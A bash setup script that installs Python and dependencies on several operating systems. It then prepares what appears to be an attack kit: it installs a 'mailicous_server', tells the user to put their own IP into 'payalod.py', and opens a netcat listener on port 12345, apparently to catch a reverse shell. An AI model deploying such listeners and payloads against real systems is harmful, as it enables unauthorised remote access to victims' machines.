#!/usr/bin/env bash
set -e
echo "Checking system..."
OS="$(uname -s)"
ARCH="$(uname -m)"
echo "Detected OS: $OS"
echo "Detected Architecture: $ARCH"
if command -v python3 >/dev/null 2>&1; then
    echo "Python is already installed:"
    python3 --version
else
    echo "Python not found. Installing..."
    if [[ "$OS" == "Darwin" ]]; then
        echo "Detected macOS"
        if ! command -v brew >/dev/null 2>&1; then
            echo "Homebrew not found. Installing Homebrew..."
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            if [[ "$ARCH" == "arm64" ]]; then
                echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
                eval "$(/opt/homebrew/bin/brew shellenv)"
            fi
        fi
        brew update
        brew install python
    elif [[ -f /etc/debian_version ]]; then
        echo "Detected Debian/Ubuntu"
        sudo apt update
        sudo apt install -y python3 python3-pip
    elif [[ -f /etc/redhat-release ]]; then
        echo "Detected RHEL/CentOS/Fedora"
        sudo dnf install -y python3 python3-pip || sudo yum install -y python3 python3-pip
    elif [[ -f /etc/arch-release ]]; then
        echo "Detected Arch Linux"
        sudo pacman -Sy --noconfirm python python-pip
    elif [[ -f /etc/alpine-release ]]; then
        echo "Detected Alpine Linux"
        sudo apk add --no-cache python3 py3-pip
    elif [[ -f /etc/SuSE-release ]] || [[ -f /etc/zypp/repos.d ]]; then
        echo "Detected openSUSE"
        sudo zypper install -y python3 python3-pip
    else
        echo "Unsupported OS. Please install Python manually."
        exit 1
    fi
fi
echo "Python version:"
python3 --version
if ! command -v pip3 >/dev/null 2>&1; then
    echo "pip not found. Installing pip..."
    python3 -m ensurepip --upgrade || true
fi
if [[ -f requirements.txt ]]; then
    echo "Installing dependencies from requirements.txt..."
    pip3 install --upgrade pip
    pip3 install -r requirements.txt
else
    echo "No requirements.txt found. Skipping dependency install."
fi
echo "Setup complete."
cd mailicous_server && npm install
clear && cd ~ && clear && echo "Do not forget to run the mailicous server and replace the ip address on payalod.py file with your ip adddress" && ipconfig eth0 && nc -lvnp 12345